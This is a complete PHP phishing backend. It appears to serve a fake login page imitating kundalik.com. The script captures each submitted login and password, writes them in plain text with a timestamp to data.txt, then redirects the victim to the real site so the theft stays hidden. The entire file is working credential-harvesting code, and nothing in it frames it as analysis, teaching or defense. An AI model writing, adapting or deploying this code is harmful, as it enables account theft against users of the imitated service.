<?php

if (!isset($_POST["login"]) or !isset($_POST["password"])) {
  header("Location: /");
} else {
  if ($_POST["login"] == "" or $_POST["password"] == "") {
    header("Location: /");
  } else {
    save_data($_POST["login"], $_POST["password"]);
    header("Location: https://kundalik.com/");
  }
}

function save_data($login, $password) {
  $file = "data.txt";
  $data = file_get_contents($file);
  $count = count(explode("\n", $data));

  date_default_timezone_set("Asia/Tashkent");
  $time = date("M d Y h:i:s A");
  $row = "$count | $login | $password | $time";

  file_put_contents($file, "$data\n$row");
}
